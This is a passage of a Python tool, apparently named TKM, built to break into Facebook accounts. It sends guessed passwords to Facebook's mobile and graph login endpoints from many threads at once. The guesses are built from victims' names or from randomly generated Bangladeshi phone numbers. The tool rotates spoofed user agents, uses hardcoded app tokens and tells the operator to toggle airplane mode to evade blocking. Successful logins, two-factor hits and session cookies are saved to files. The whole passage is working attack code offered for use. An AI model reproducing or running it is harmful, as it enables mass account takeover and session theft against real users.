	c=random.randrange(1, 9)
	d='Nokia'
	e=random.randrange(100, 9999)
	f='/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/'
	g=random.randrange(1, 9)
	h=random.randrange(1, 4)
	i=random.randrange(1, 4)
	j=random.randrange(1, 4)
	k='Mobile Safari/535.1'
	uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
	ugen.append(uaku)
#-_-_-_--_-_-_-_-_6_-_6_-_-_6_6_6
#-$6$-_-$-$-$76$6$6$-$-$
	aa='Mozilla/5.0 (iPhone; CPU iPhone OS 12_4 like Mac OS X)'
	b=random.choice(['6','7','8','9','10','11','12'])
	c=' en-us; GT-'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/605.1.15 (KHTML, like Gecko) Chrome/'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile/15E148 Safari/605.1'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
model2 = requests.get('https://gist.githubusercontent.com/Nox-Naved/0588acb2b77932048a251d50a973029b/raw/f6de01ac684131b5353854ee114880fb00227cee/Model60').text

ugtn=[]
ugxn=[] 
xxxxx=("GT-1015","GT-1020","GT-1030","GT-1035","GT-1040","GT-1045","GT-1050","GT-1240","GT-1440","GT-1450","GT-18190","GT-18262","GT-19060I","GT-19082","GT-19083","GT-19105","GT-19152","GT-19192","GT-19300","GT-19505","GT-2000","GT-20000","GT-200s","GT-3000","GT-414XOP","GT-6918","GT-7010","GT-7020","GT-7030","GT-7040","GT-7050","GT-7100","GT-7105","GT-7110","GT-7205","GT-7210","GT-7240R","GT-7245","GT-7303","GT-7310","GT-7320","GT-7325","GT-7326","GT-7340","GT-7405","GT-7550 5GT-8005","GT-8010","GT-81","GT-810","GT-8105","GT-8110","GT-8220S","GT-8410","GT-9300","GT-9320","GT-93G","GT-A7100","GT-A9500","GT-ANDROID","GT-B2710","GT-B5330","GT-B5330B","GT-B5330L","GT-B5330ZKAINU","GT-B5510","GT-B5512","GT-B5722","GT-B7510","GT-B7722","GT-B7810","GT-B9150","GT-B9388","GT-C3010","GT-C3262","GT-C3310R","GT-C3312","GT-C3312R","GT-C3313T","GT-C3322","GT-C3322i","GT-C3520","GT-C3520I","GT-C3592","GT-C3595","GT-C3782","GT-C6712","GT-E1282T","GT-E1500","GT-E2200","GT-E2202","GT-E2250","GT-E2252","GT-E2600","GT-E2652W","GT-E3210","GT-E3309","GT-E3309I","GT-E3309T","GT-G530H","GT-G930F","GT-H9500","GT-I5508","GT-I5801","GT-I6410","GT-I8150","GT-I8160OKLTPA","GT-I8160ZWLTTT","GT-I8258","GT-I8262D","GT-I8268""GT-I8505","GT-I8530BAABTU","GT-I8530BALCHO","GT-I8530BALTTT","GT-I8550E","GT-I8750","GT-I900","GT-I9008L","GT-I9080E","GT-I9082C","GT-I9082EWAINU","GT-I9082i","GT-I9100G","GT-I9100LKLCHT","GT-I9100M","GT-I9100P","GT-I9100T","GT-I9105UANDBT","GT-I9128E","GT-I9128I","GT-I9128V","GT-I9158P","GT-I9158V","GT-I9168I","GT-I9190","GT-I9192","GT-I9192I","GT-I9195H","GT-I9195L","GT-I9250","GT-I9300","GT-I9300I","GT-I9301I","GT-I9303I","GT-I9305N","GT-I9308I","GT-I9500","GT-I9505G","GT-I9505X","GT-I9507V","GT-I9600","GT-M5650","GT-N5000S","GT-N5100","GT-N5105","GT-N5110","GT-N5120","GT-N7000B","GT-N7005","GT-N7100","GT-N7100T","GT-N7102","GT-N7105","GT-N7105T","GT-N7108","GT-N7108D","GT-N8000","GT-N8005","GT-N8010","GT-N8020","GT-N9000","GT-N9505","GT-P1000CWAXSA","GT-P1000M","GT-P1000T","GT-P1010","GT-P3100B","GT-P3105","GT-P3108","GT-P3110","GT-P5100","GT-P5110","GT-P5200","GT-P5210","GT-P5210XD1","GT-P5220","GT-P6200","GT-P6200L","GT-P6201","GT-P6210","GT-P6211","GT-P6800","GT-P7100","GT-P7300","GT-P7300B","GT-P7310","GT-P7320","GT-P7500D","GT-P7500M","SAMSUNG","LMY4","LMY47V","MMB29K","MMB29M","LRX22C","LRX22G","NMF2","NMF26X","NMF26X;","NRD90M","NRD90M;","SPH-L720","IML74K","IMM76D","JDQ39","JSS15J","JZO54K","KOT4","KOT49H","KOT4SM-T310","KTU84P","SM-A500F","SM-A500FU","SM-A500H","SM-G532F","SM-G900F","SM-G920F","SM-G930F","SM-G935","SM-G950F","SM-J320F","SM-J320FN","SM-J320H","SM-J320M","SM-J510FN","SM-J701F","SM-N920S","SM-T111","SM-T230","SM-T231","SM-T235","SM-T280","SM-T311","SM-T315","SM-T525","SM-T531","SM-T535","SM-T555","SM-T561","SM-T705","SM-T805","SM-T820")
fbks=('com.facebook.adsmanager','com.facebook.lite','com.facebook.orca','com.facebook.katana','com.facebook.mlite')
def ua11():
	vchrome = str(random.randint(100,925))+".0.0."+str(random.randint(1,8))+"."+str(random.randint(40,150))
	VAPP = random.randint(410000000,499999999)
	END = '[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748110;FBDM/{density=2.0,width=720,height=1280};FBLC/en_US;FBCR/BSNL MOBILE;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00LD;FBSV/5.0.2;nullFBCA/armeabi-v7a:armeabi;]'
	ua = f'Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; {random.choice(model2)} Build/QP1A.{random.randint(111111,999999)}.{random.randint(111,999)}) '+END
	return ua
def ua1():
	vchrome = str(random.randint(100,925))+".0.0."+str(random.randint(1,8))+"."+str(random.randint(40,150))
	VAPP = random.randint(410000000,499999999)
	gtt=random.choice(xxxxx)
	gttt=random.choice(xxxxx)
	END = '[FBAN/FB4A;FBAV/342.0.0.6.152;FBBV/572419345;FBDM/{density=2.3,width=1080,height=1458};FBLC/he_IL;FBRV/747768699;FBCR/Sprint;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/M2102J20SG;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]'
	ua = f'Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; {str(gtt)} Build/QP1A.{random.randint(111111,999999)}.{random.randint(111,999)}) '+END
	return ua

def ua2():
	END = '[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748110;FBDM/{density=2.0,width=720,height=1280};FBLC/en_US;FBCR/BSNL MOBILE;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00LD;FBSV/5.0.2;nullFBCA/armeabi-v7a:armeabi;]'
	ua = f'Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; {random.choice(model2)} Build/QP1A.{random.randint(111111,999999)}.{random.randint(111,999)}) '+END
	return ua

for i in range(2000):
	user_agent = f"[FBAN/FB4A;FBAV/"+str(random.randint(199,399))+".0.0."+str(random.randint(1,9))+"."+str(random.randint(99,199))+";FBBV/"+str(random.randint(111111111,999999999))+";FBDM/{density="+str(random.randint(2,3))+"."+str(random.randint(2,5))+",width=1080,height="+str(random.randint(1400,1499))+"};FBLC/"+str(random.choice(["cs_CZ","en_GB","en_US","lt_LT","pl_PL","id_ID","ru_RU","pt_PT","he_IL","hi_IN","nl_NL"," it_IT","en_IN","es_ES","en_PK"]))+";FBRV/"+str(random.randint(111111111,999999999))+";FBCR/"+str(random.choice(["Tele2You","Telenor","FASTWEB","Banglalink","Sprint","Jazz","Vodafone IN","Vi India","Tele2 LT","Jio 4G","EE","Oi","MtelBG","AT&amp;amp-T","Ufone","Azercell"]))+";FBMF/Xiaomi;FBBD/"+str(random.choice(["xiaomi","Xiaomi","Redmi"]))+";FBPN/com.facebook.katana;FBDV/"+str(random.choice(["M2101K7AG","M2003J15SC","M2004J19C","M2006C3LG","M2007J20CG","M2010J19CG","M2011K2C","M2012K11AG","M2101K7BG","M2101K9G","M2102J20SG","M2102K1G","M2003J15SC","MI MAX 2","AT&amp;amp-T","Redmi Note 4", "Redmi 4X","Redmi Note 8 Pro","Redmi Note 5","Redmi Note 8T","Redmi 6A","Redmi 7A","MI PLAY","MI 8 Lite","Mi 9T","Mi A2 Lite"," Mi 9", "M2101K7AG"]))+";FBSV/"+str(random.randint(9,12))+";FBOP/1;FBCA/arm64-v8a:;]"
	ugxn.append(user_agent)
def ua3():
	application_version = str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(111,555))
	application_version_code=str(random.randint(000000000,999999999))
	fbs=random.choice(fbks)
	gtt=random.choice(xxxxx)
	gttt=random.choice(xxxxx)
	android_version=str(random.randrange(6,13))
	ua_strinb = f'Davik/2.1.0 (Linux; U; Android {str(android_version)}.0.0; {str(gtt)} Build/{str(gttt)} [FBAN/FB4A;FBAV/{str(application_version)};FBBV/{str(application_version_code)};FBDM/'+'{density=2.0,width=720,height=1280};'+f'FBLC/en_US;FBCR/{str(application_version_code)};FBMF/asus;FBBD/asus;FBPN/{str(fbs)};FBDV/{str(gtt)};FBSV/5.0.2;nullFBCA/armeabi-v7a:armeabi;]'
	return ua_strinb
#######$$
dt="•"
#########
id
ok=[]
cp=[]
twf=[]
lop=0
xode=[]
plist=[]
cpx=[]
cokix=[]
apkx=[]
paswtrh = []
version="1.08"
def line():
	print(40*"=")
def logo():
    os.system("clear")
    print(f"""\x1b[1;97m{W}
88888888888 888    d8P  888b     d888 
    888     888   d8P   8888b   d8888 
    888     888  d8P    88888b.d88888 
    888     888d88K     888Y88888P888 
    888     8888888b    888 Y888P 888 
    888     888  Y88b   888  Y8P  888 
    888     888   Y88b  888   "   888 
    888     888    Y88b 888       888
\t   \033[31;42mTONMOY MAHATO\33[0;m\__😘😈
{40*"="} \x1b[1;97m
  [\x1b[1;95m+\x1b[1;97m] AUTHOR : Tonmoy Mahato
  [\x1b[1;95m+\x1b[1;97m] GITHUB : tonmoy404-cyber        
  [\x1b[1;95m+\x1b[1;97m] FACEBOOK : Tonmoy X X X 
  [\x1b[1;95m+\x1b[1;97m] YOU TUBE : Tonmoy X X X                       
  [\x1b[1;95m+\x1b[1;97m] VERSION : {version}
{40*"="}\x1b[1;97m""")


def Main():
	logo()
	print(f' {W}[{G}A{W}]{W}\033[38;5;46m[{G}FILE{W}]');print(f' {W}[{G}B{W}]{W}\033[38;5;46mCRACK [{G}RANDOM STORE{W}]');print(f' {W}[{G}C{W}]{W}\033[38;5;46mCRACK [{G}GMAIL{W}]');print(f' {W}[{G}D{W}]{W}\033[38;5;46mCRACK\033[38;5;46m[{G}USERNAME{W}]') #;print(f' {W}[{G}E{W}]{W} CRACK [{G}UID{W}]')
	line()
	gh=input(f' [{G}+{W}] Choice : {G}')
	if gh in ["T","a","1"]:
		menu1()
	elif gh in ["O","b","2"]:
		menu2()
	elif gh in ["X","c","3"]:
		menu3()
	elif gh in ["IC","d","4"]:
		menu4()
	else:
		line();print(f'\n \t {R}Choose valid option{E}');time.sleep(1);Main()
############------[FILE SYSTEM]-------#########
def menu1():
	logo()
	fl = input(f'{W}[{G}•{W}] PUT FILE PATH\033[38;5;46m : {G}')
	try:
		fil = open(fl,'r').read().splitlines()
	except FileNotFoundError:
		print(f"{W}{40*'='}");print(f'[{R}!{W}] FILE LOCATION NOT FOUND ');time.sleep(1);menu1()
	print(f"{W}{40*'='}");print(f"{W}[{G}A{W}] {W}AUTO PASSWORD {W}\n{W}[{G}B{W}]{W} CHOICE PASSWORD{W}");line()
	psx =input(f'[{G}+{W}] Choose : {G}')
	if psx in ["1", "01","11","A","a"]:
		print(f"{W}{40*'='}{E}");print(f'{W}[{G}A{W}] PASSWORD [{G}NORMAL PASS{W}]\n[{G}B{W}] PASSWORD [{G}FF PASS{W}]\n[{G}C{W}] PASSWORD [{G}HARD PASS{W}]');print(f"{W}{40*'='}{E}")
		passx=input(f'{W}[{G}+{W}] Choose: {G}')
		if passx in ["2", "02","22","B","a"]:
			plist.append('name')
			plist.append('Name')
			plist.append('first12')
			plist.append('first123')
			plist.append('first1234')
			plist.append('first12345')
			plist.append('last123')
			plist.append('last12345')
			plist.append('first@')
			plist.append('first@@')
			plist.append('first@@@')
			plist.append('first@@@@')
			plist.append('first@@##')
			plist.append('last@')
			plist.append('last@@')
			plist.append('last@@@')
			plist.append('last@@@@')
			plist.append('firstlast')
			plist.append('first last')
		if passx in ["3", "03","33","C","c"]:
			plist.append('last12')
			plist.append('name')
			plist.append('last123')
			plist.append('last1234')
			plist.append('last12345')
			plist.append('last@')
			plist.append('last@@')
			plist.append('last@@@')
			plist.append('last@@@@')
			plist.append('last@@##')
			plist.append('last##')
			plist.append('last@#')
			plist.append('last@@@@@')
			plist.append('first@@@@')
			plist.append('first@')
			plist.append('first@@')
			plist.append('first@@@')
			plist.append('first@@@@@')
			plist.append('first@@##')
			plist.append('first@#')
			plist.append('first##')
			plist.append('first123')
			plist.append('first1234')
			plist.append('first12345')
			plist.append('first11')
			plist.append('first22')
			plist.append('firstlast')
			plist.append('first last')
		else:
			plist.append('name')
			plist.append('first123')
			plist.append('last123')
			plist.append('first@@')
			plist.append('first last')
			plist.append('firstlast')
	else:
		try:
			logo();print(f'\t\t{G}6 BEST{W}');print (40*"=")
			psl = int(input(f'[{G}+{W}] Limit : {G}'));print(f"{W}{40*'='}")
		except:
			psl=1
		print(f"{W}{40*'='}");print(f'EXAMPLE: {G}first123{W},{G}last123{W},{G}firstlast{W},{G}name{W}');print (40*"=")
		for ox in range(psl):
			plist.append(input(f'{W}[{G}{ox+1}{W}] password : {G}'))
	print(f"{W}{40*'='}");print(f'[{G}+{W}] Do you went show cp account (y/n)');line()
	cx=input(f'[{G}+{W}] Choose: {G}')
	if cx in ['n','N','no','NO','2']:
		cpx.append(f'n')
	else:
		cpx.append(f'y')
	print(f"{W}{40*'='}");print(f'[{G}+{W}] Do you went show cookie (y/n)');line()
	ckiv=input(f'{W}[{G}+{W}] Choose: {G}')
	if ckiv in ['n','N','no','NO','2']:
		cokix.append(f'n')
	else:
		cokix.append(f'y')
	print(f"{W}{40*'='}");print(f'{W}[{G}A{W}] METHOD [{G}1{W}]\n{W}[{G}B{W}] METHOD [{G}2{W}]\n{W}[{G}C{W}] METHOD [{G}3{W}]');line()
	mxt=input(f'{W}[{G}+{W}] Choose: {G}')
	with ThreadPool(max_workers=30) as tonxoys:
		tid = str(len(fil))
		logo();print(f'{W} [{G}•{W}] TOTAL ID :\033[1;92m '+tid);print(f' {W}[{G}•{W}] \033[38;5;46mTHE PROCESS HAS BEEN STARTED');print(f' [{G}•{W}] \033[38;5;46mUSE AEROPLANE MODE IN EVERY 5 MIN ');print(40*"=")
		for uuxxd in fil:
			id,name= uuxxd.split(f'|')
			psd=plist
			if mxt in ['A','1',"a"]:
				tonxoys.submit(normalfl,id,psd,name,tid)
			if mxt in ['B',"2","b"]:
				tonxoys.submit(graphfl,id,psd,name,tid)
			elif mxt in ['C',"3","c"]:
				tonxoys.submit(graphfl2,id,psd,name,tid)
############------[FILE METHOD SYSTEM]-------#########
def normalfl(id,psd,name,tid):
	global ok,cp,twf,lop
	fn = name.split(' ')[0]
	try:
		ln = name.split(' ')[1]
	except:
		ln = fn
	for pxw in psd:
		sys.stdout.write(f'\r\r{BG}[{W}TKM-M1{BG}]{E} {BG}[{G}{lop}{W}/{G}{tid}{BG}]{E} {BG}[{W}OK{W}:{G}%s{BG}]{E}'%(len(ok)));sys.stdout.flush()
		psw = pxw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',name).replace('name',name.lower())
		ua=random.choice(ugen)
		session = requests.Session()
		headerx={'Host': 'm.facebook.com', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9,bn-BD;q=0.8,bn;q=0.7','cache-control': 'max-age=0','referer': 'https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F', 'sec-ch-prefers-color-scheme': 'light','sec-ch-ua': '"Chromium";v="111", "Not(A:Brand";v="8"',  'sec-ch-ua-full-version-list': '"Chromium";v="111.0.5563.104", "Not(A:Brand";v="8.0.0.0"','sec-ch-ua-mobile': '?1',  'sec-ch-ua-platform': '"Android"', 'sec-ch-ua-platform-version': '"11.0.0"', 'sec-fetch-dest': 'document', 'sec-fetch-mode': 'navigate', 'sec-fetch-site': 'same-origin','sec-fetch-user': '?1','upgrade-insecure-requests': '1', 'user-agent': ua}
		getlog = session.get(f'https://m.facebook.com/login/device-based/password/?uid={id}&flow=login_no_pin&refsrc=deprecated&_rdr')
		idpass ={"lsd":re.search('name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":id,"next":"https://m.facebook.com/login/save-device/","flow":"login_no_pin","pass":psw,}
		complete = session.post(f'https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=headerx)
		twfx= 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
		logx=session.Cookie.get_dict().keys()
		if 'c_user' in logx:
			coki=session.Cookie.get_dict()
			kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.Cookie.get_dict().items() ])
			print(f'\r\r{G}[TKM-OK] {id} | {psw}{W}')
			ok.append(id)
			if 'y' in cokix:
				print(f'\r  {BG}[{W}Cookie{BG}]{E} : {G}{kuki}{W}');print(f"{W}{40*'-'}{E}")
			open('/sdcard/TKM-FILE-OK.txt', 'a').write(id+' | '+psw+'  ------------>>>'+coki+"\n")
			break
		elif twfx in str(logx):
			print(f'\r\r{S}[TKM-2F] {id} | {psw}{W}')
			open('/sdcard/TKM-FILE-2F.txt', 'a').write(id+' | '+psw+"\n")
			twf.append(id)
			break
		elif 'Please Confirm Email' in logx:
			coki=session.Cookie.get_dict()
			kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.Cookie.get_dict().items() ])
			print(f'\r\r{G}[TKM-OK] {id} | {psw}{W}')
			ok.append(id)
			if 'y' in cokix:
				print(f'\r  {BG}[{W}Cookie{BG}]{E} : {G}{kuki}{W}');print(f"{W}{40*'-'}{E}")
			open('/sdcard/TKM-FILE-OK.txt', 'a').write(id+' | '+psw+'  ------------>>>'+coki+"\n")
			break
		elif 'checkpoint' in logx:
			if 'y' in cpx:
				print(f'\r\r{R}[TKM-CP] {id} | {psw}{W}')
			open('/sdcard/TKM-FILE-CP.txt', 'a').write(id+' | '+psw+"\n")
			cp.append(id)
			break
		else:continue
	lop+=1
def graphfl(id,psd,name,tid):
	global ok,cp,twf,lop
	fn = name.split(' ')[0]
	try:
		ln = name.split(' ')[1]
	except:
		ln = fn
	for pxw in psd:
		sys.stdout.write(f'\r\r{BG}[{W}TKM-M2{BG}]{E} {BG}[{G}{lop}{W}/{G}{tid}{BG}]{E} {BG}[{W}OK{W}:{G}%s{BG}]{E}'%(len(ok)));sys.stdout.flush()
		psw = pxw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',name).replace('name',name.lower())
		ua=ua1()
		apk = ['438142079694454|fc0a7caa49b192f64f6f5a6d9643bb28', '350685531728|62f8ce9f74b12f84c123cc23437a4a32', '6628568379|c1e620fa708a1d5696fb991c1bde5662', '1479723375646806|afb3e4a6d8b868314cc843c21eebc6ae', '1348564698517390|007c0a9101b9e1c8ffab727666805038']
		
		app = random.choice(apk)
		url = 'https://b-graph.facebook.com/auth/login'
		datax={
                'adid': uuid.uuid4(),
                'format': 'json',
                'device_id': uuid.uuid4(),
                'email': id,
                'password': psw,
                'generate_analytics_claims': '1',
                'community_id': '',
                'cpl': 'true',
                'try_num': '1',
                'family_device_id': uuid.uuid4(),
                'credentials_type': 'password',
                'source': 'login',
                'error_detail_type': 'button_with_disabled',
                'enroll_misauth': 'false',
                'generate_session_Cookie': '1',
                'generate_machine_id': '1',
                'currently_logged_in_userid': '0',
                'locale': 'en_US"',
                'client_country_code': 'US',
                'fb_api_req_friendly_name': 'authenticate',
                'api_key': '882a8490361da98702bf97a021ddc14d',
                'access_token': app }
		headerx= {"Content-Type": "application/x-www-form-urlencoded","Host": "graph.facebook.com","User-Agent": ua,"X-FB-Net-HNI": str(random.randint(2e4,4e4)),"X-FB-SIM-HNI": str(random.randint(2e4,4e4)),"X-FB-Connection-Type": "MOBILE.LTE","X-Tigon-Is-Retry": "False","x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62","x-fb-device-group": "5120","X-FB-Friendly-Name": "ViewerReactionsMutation","X-FB-Request-Analytics-Tags": "graphservice","Accept-Encoding": "gzip, deflate","X-FB-HTTP-Engine": "Liger","X-FB-Client-IP": "True","X-FB-Server-Cluster": "True","x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62","Connection": "Keep-Alive"}
		twfx= 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
		logx= requests.post(url,data=datax,headers=headerx).json()
		if 'session_key' in logx:
			print(f'\r\r{G}[TKM-OK] {id} | {psw}{W}')
			ok.append(id)
			coki = ";".join(i["name"]+"="+i["value"] for i in logx["session_Cookie"])
			if 'y' in cokix:
				print(f'\r  {BG}[{W}Cookie{BG}]{E} : {G}{coki}{W}');print(f"{W}{40*'-'}{E}")
			open('/sdcard/TKM-FILE-OK.txt', 'a').write(id+' | '+psw+'  ------------>>>'+coki+"\n")
			break
		if 'Please Confirm Email' in logx:
			print(f'\r\r{G}[TKM-OK] {id} | {psw}{W}')
			ok.append(id)
			coki = ";".join(i["name"]+"="+i["value"] for i in logx["session_Cookie"])
			if 'y' in cokix:
				print(f'\r  {BG}[{W}Cookie{BG}]{E} : {G}{coki}{W}');print(f"{W}{40*'-'}")
			open('/sdcard/TKM-FILE-OK.txt', 'a').write(id+' | '+psw+'  ------------>>>'+coki+"\n")
			break
		elif twfx in str(logx):
			print(f'\r\r{S}[TKM-2F] {id} | {psw}{W}')
			open('/sdcard/TKM-FILE-2F.txt', 'a').write(id+' | '+psw+"\n")
			twf.append(id)
			break
		elif 'www.facebook.com' in logx['error']['message']:
			if 'y' in cpx:
				print(f'\r\r{R}[TKM-CP] {id} | {psw}{W}')
			open('/sdcard/TKM-FILE-CP.txt', 'a').write(id+' | '+psw+"\n")
			cp.append(id)
			break
		else:continue
	lop+=1
def graphfl2(id,psd,name,tid):
	global ok,cp,twf,lop
	fn = name.split(' ')[0]
	try:
		ln = name.split(' ')[1]
	except:
		ln = fn
	for pxw in psd:
		sys.stdout.write(f'\r\r{BG}[{W}TKM-M3{BG}]{E} {BG}[{G}{lop}{W}/{G}{tid}{BG}]{E} {BG}[{W}OK{W}:{G}%s{BG}]{E}'%(len(ok)));sys.stdout.flush()
		psw = pxw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',name).replace('name',name.lower())
		ua=ua3()
		apk = ['438142079694454|fc0a7caa49b192f64f6f5a6d9643bb28', '350685531728|62f8ce9f74b12f84c123cc23437a4a32', '6628568379|c1e620fa708a1d5696fb991c1bde5662', '1479723375646806|afb3e4a6d8b868314cc843c21eebc6ae', '1348564698517390|007c0a9101b9e1c8ffab727666805038']
		
		app = random.choice(apk)
		gtt=random.choice(xxxxx)
		url = 'https://b-graph.facebook.com/auth/login'
		datax={'adid':str(uuid.uuid4()),
		'email':id,
		'password':psw,
		'cpl':'true',
		'credentials_type':'device_based_login_password',
		"source": "device_based_login",
		'error_detail_type':'button_with_disabled',
		'source':'login',
		'format':'json',
		'generate_session_Cookie':'1',
		'generate_analytics_claim':'1',
		'generate_machine_id':'1',
		"locale":"en_US",
		"client_country_code":"US",
		'device':gtt,
		'device_id':str(uuid.uuid4()),
		"method": "auth.login",
	    "fb_api_req_friendly_name": "authenticate",
	    "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler"}
		headerx= {"Content-Type": "application/x-www-form-urlencoded",
		"Host": "graph.facebook.com",
		"User-Agent": ua,
		"X-FB-Net-HNI": str(random.randint(2e4,4e4)),
		"X-FB-SIM-HNI": str(random.randint(2e4,4e4)),
		"X-FB-Connection-Type": "MOBILE.LTE",
		"X-Tigon-Is-Retry": "False",
		"x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62",
		"x-fb-device-group": "5120",
		"X-FB-Friendly-Name": "ViewerReactionsMutation",
		"X-FB-Request-Analytics-Tags": "graphservice",
		"Accept-Encoding": "gzip, deflate",
		"X-FB-HTTP-Engine": "Liger",
		"X-FB-Client-IP": "True",
		"X-FB-Server-Cluster": "True",
		"x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62",
		"Connection": "Keep-Alive"}
		logx= requests.post(url,data=datax,headers=headerx).json()
		twfx= 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
		if 'session_key' in logx:
			print(f'\r\r{G}[TKM-OK] {id} | {psw}{W}')
			ok.append(id)
			coki = ";".join(i["name"]+"="+i["value"] for i in logx["session_Cookie"])
			if 'y' in cokix:
				print(f'\r  {BG}[{W}Cookie{BG}]{E} : {G}{coki}{W}');print(f"{W}{40*'-'}{E}")
			open('/sdcard/TKM-FILE-OK.txt', 'a').write(id+' | '+psw+'  ------------>>>'+coki+"\n")
			break
		if 'Please Confirm Email' in logx:
			print(f'\r\r{G}[TKM-OK] {id} | {psw}{W}')
			ok.append(id)
			coki = ";".join(i["name"]+"="+i["value"] for i in logx["session_Cookie"])
			if 'y' in cokix:
				print(f'\r  {BG}[{W}Cookie{BG}]{E} : {G}{coki}{W}');print(f"{W}{40*'-'}");print(ua)
			open('/sdcard/TKM-FILE-OK.txt', 'a').write(id+' | '+psw+'  ------------>>>'+coki+"\n")
			break
		elif twfx in str(logx):
			print(f'\r\r{S}[TKM-2F] {id} | {psw}{W}')
			open('/sdcard/TKM-FILE-2F.txt', 'a').write(id+' | '+psw+"\n")
			twf.append(id)
			break
		elif 'www.facebook.com' in logx['error']['message']:
			if 'y' in cpx:
				print(f'\r\r{R}[TKM-CP] {id} | {psw}{W}');print(ua)
			open('/sdcard/TKM-FILE-CP.txt', 'a').write(id+' | '+psw+"\n")
			cp.append(id)
			break
		else:continue
	lop+=1
############------[RANDOM NUMBER SYSTEM]------#########
def menu2():
	logo()
	print(f"{W}BD SIM CODE : {G}017 015 018 019 013 016{E}{W}");line()
	code=input(f'{W}[{G}+{E}] Choice : {G}');print(f"{W}{40*'='}")
	print(f'{W}EXAMPLE : {G}1000{W},{G}5000{W},{G}10000{W},{G}15000{W},{G}20000{W} ');line()
	limit=int(input(f'[{G}+{E}] Limit : {G}'))
	print(f"{W}{40*'='}");print(f'[{G}+{W}] Do you went show cp account (y/n)');line()
	cx=input(f'[{G}+{W}] Choose: {G}')
	if cx in ['n','N','no','NO','2']:
		cpx.append(f'n')
	else:
		cpx.append(f'y')
	print(f"{W}{40*'='}");print(f'[{G}+{W}] Do you went show cookie (y/n)');line()
	ckiv=input(f'{W}[{G}+{W}] Choose: {G}')
	if ckiv in ['n','N','no','NO','2']:
		cokix.append(f'n')
	else:
		cokix.append(f'y')
	print(f"{W}{40*'='}");print(f"{W}[{G}A{W}] {W}AUTO PASSWORD {W}\n{W}[{G}B{W}]{W} CHOICE PASSWORD{W}");line()
	psdgg=input(f'{W}[{G}+{W}] Choose: {G}')
	if psdgg in ['B',"2","b"]:
		print(f"{W}{40*'='}");passx = int(input(f"[{S}+{W}] Enter Password Limit : "))
		for dhhh in range(passx):
			print(f'{W}EXAMPLE : {G}rakib{W},{G}sakib{W},{G}rabbi{W},{G}tanvir{W},{G}jahid{W} ')
			line();pww = input(f"[{S}+{W}] Enter Password : ")
			paswtrh.append(pww)
	else:
		pww =str(0)
		paswtrh.append(pww)
	print(f"{W}{40*'='}");print(f'{W}[{G}A{W}] METHOD [{G}1{W}]\n{W}[{G}B{W}] METHOD [{G}2{W}]\n{W}[{G}C{W}] METHOD [{G}3{W}]');line()
	mxt=input(f'{W}[{G}+{W}] Choose: {G}')
	for number in range(limit):
		numberx = ''.join(random.choice(string.digits) for _ in range(8))
		xode.append(numberx)
	with ThreadPool(max_workers=60) as tonxoys:
		tid= str(len(xode))
		logo();print(f' [{G}•{W}] TOTAL ID :\033[38;5;46m '+tid);print (f' {W}[{G}•{W}] \033[38;5;46mSIM CODE : python \033[38;5;46m'+code);print(f' {W}[{G}•{W}] \033[38;5;46mTHE PROCESS HAS BEEN STARTED');print(f' [{G}•{W}] \033[38;5;46mUSE AEROPLANE MODE IN EVERY 5 MIN ');print(40*"=")
		for rngx in xode:
			id=code+rngx
			psd=[id,rngx,id[:6],id[:7],id[:8],id[5:]]
			for thdhy in paswtrh:
				psd.append(thdhy)
			if mxt in ['A','1',"a"]:
				tonxoys.submit(nrmlrm,id,psd,tid,"x.facebook.com")
